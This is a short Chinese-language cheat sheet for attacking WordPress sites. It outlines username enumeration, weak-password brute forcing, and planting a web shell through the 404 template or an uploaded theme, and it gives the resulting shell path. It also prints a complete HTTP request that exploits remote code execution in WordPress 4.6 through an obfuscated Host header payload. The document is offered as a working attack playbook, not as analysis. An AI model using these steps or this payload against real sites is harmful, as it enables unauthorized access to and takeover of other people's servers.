---
title: Wordpress
---

## [弱口令]-后台Getshell

枚举用户名 -> 爆破弱口令 -> 后台上传shell

（1）编辑404页面Getshell

```
在404页面写入一句话木马即可
```

（2）上传主题文件Getshell

```
下载主题文件，把shell放入主题文件中，然后上传

shell路径：/wp-content/themes/[主题名]/[shell文件名]
```



## 其它漏洞

`4.6版本`存在RCE命令执行漏洞

```http
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
Connection: close
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```

> 还有各种插件漏洞